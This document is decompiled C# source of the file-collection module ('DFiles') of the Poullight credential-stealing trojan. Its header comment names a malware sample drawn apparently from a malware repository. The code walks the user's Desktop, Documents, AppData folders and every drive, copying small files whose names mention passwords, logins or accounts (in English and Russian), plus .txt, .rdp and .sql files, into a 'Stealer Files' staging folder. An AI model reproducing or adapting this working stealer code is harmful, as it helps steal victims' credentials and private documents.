// Decompiled with JetBrains decompiler
// Type: DFiles
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.IO;

internal class DFiles
{
  protected static string path = string.Format("{0}Stealer Files", (object) Buffer.path_l);

  protected static void SearchFiles(string dir, string _path)
  {
    bool flag = false;
    string[] strArray = new string[7]
    {
      ".txt",
      ".rtf",
      ".log",
      ".doc",
      ".docx",
      ".rdp",
      ".sql"
    };
    FileInfo[] files = new DirectoryInfo(dir).GetFiles();
    if (files.Length == 0)
      return;
    foreach (FileInfo fileInfo in files)
    {
      string lower = fileInfo.Extension.ToLower();
      string str1 = fileInfo.Name.ToLower().Substring(0, fileInfo.Name.Length - lower.Length);
      if (str1.Contains("password") || str1.Contains("login") || str1.Contains("account") || str1.Contains("аккаунт") || str1.Contains("парол") || str1.Contains("вход") || str1.Contains("важно") || str1.Contains("сайта") || str1.Contains("site"))
      {
        try
        {
          if (fileInfo.Length <= 50000L)
          {
            if (!flag && !Directory.Exists(_path))
            {
              Directory.CreateDirectory(_path);
              flag = true;
            }
            fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
          }
        }
        catch
        {
        }
      }
      else
      {
        foreach (string str2 in strArray)
        {
          try
          {
            if (!(str2 != lower))
            {
              if (!flag && !Directory.Exists(_path))
              {
                Directory.CreateDirectory(_path);
                flag = true;
              }
              fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
              break;
            }
          }
          catch
          {
          }
        }
      }
    }
  }

  public static void Start()
  {
    try
    {
      if (!Directory.Exists(DFiles.path))
        Directory.CreateDirectory(DFiles.path);
      string str1 = (string) null;
      string[] strArray1 = (string[]) null;
      string str2 = (string) null;
      string[] strArray2 = (string[]) null;
      string str3 = (string) null;
      string[] strArray3 = (string[]) null;
      string str4 = (string) null;
      string[] strArray4 = (string[]) null;
      try
      {
        str1 = Buffer.path_dp;
      }
      catch
      {
      }
      try
      {
        str2 = Buffer.path_ds;
      }
      catch
      {
      }
      try
      {
        str3 = Buffer.path_ad;
      }
      catch
      {
      }
      try
      {
        str4 = Buffer.path_lad;
      }
      catch
      {
      }
      try
      {
        DFiles.SearchFiles(str1, DFiles.path + "\\Desktop Files");
        strArray1 = Directory.GetDirectories(str1);
      }
      catch
      {
      }
      try
      {
        DFiles.SearchFiles(str2, DFiles.path + "\\Documents Files");
        strArray2 = Directory.GetDirectories(str2);
      }
      catch
      {
      }
      try
      {
        DFiles.SearchFiles(str3, DFiles.path + "\\AppData Files");
        strArray3 = Directory.GetDirectories(str3);
      }
      catch
      {
      }
      try
      {
        DFiles.SearchFiles(str4, DFiles.path + "\\LocalAppData Files");
        strArray4 = Directory.GetDirectories(str4);
      }
      catch
      {
      }
      if (strArray1.Length != 0)
      {
        foreach (string dir in strArray1)
          DFiles.SearchFiles(dir, DFiles.path + "\\Disks Files");
      }
      if (strArray2.Length != 0)
      {
        foreach (string dir in strArray2)
          DFiles.SearchFiles(dir, DFiles.path + "\\Disks Files");
      }
      if (strArray3.Length != 0)
      {
        foreach (string dir in strArray3)
          DFiles.SearchFiles(dir, DFiles.path + "\\Disks Files");
      }
      if (strArray4.Length != 0)
      {
        foreach (string dir in strArray4)
          DFiles.SearchFiles(dir, DFiles.path + "\\Disks Files");
      }
      foreach (string logicalDrive in Environment.GetLogicalDrives())
      {
        try
        {
          DFiles.SearchFiles(logicalDrive, DFiles.path + "\\Disks Files");
        }
        catch
        {
        }
        try
        {
          string[] directories = Directory.GetDirectories(logicalDrive);
          if (directories.Length != 0)
          {
            foreach (string str5 in directories)
            {
              try
              {
                string lower = Path.GetDirectoryName(str5).ToLower();
                if (!(lower == "windows"))
                {
                  if (!(lower == "programdata"))
                  {
                    if (!(lower == "program files (x86)"))
                    {
                      if (!(lower == "program files"))
                      {
                        if (!(lower == "пользователи"))
                        {
                          if (!(lower == "users"))
                          {
                            if (!(lower == "perflogs"))
                              DFiles.SearchFiles(str5, DFiles.path + "\\Disks Files");
                          }
                        }
                      }
                    }
                  }
                }
              }
              catch
              {
              }
            }
          }
        }
        catch
        {
        }
      }
      if (Directory.GetDirectories(DFiles.path).Length != 0)
        return;
      File.WriteAllText(DFiles.path + "\\info.txt", "===================================== [LOGS] =====================================" + Environment.NewLine + Environment.NewLine + "Файлы которые могли нести ценность не были найдены.");
    }
    catch
    {
    }
  }
}
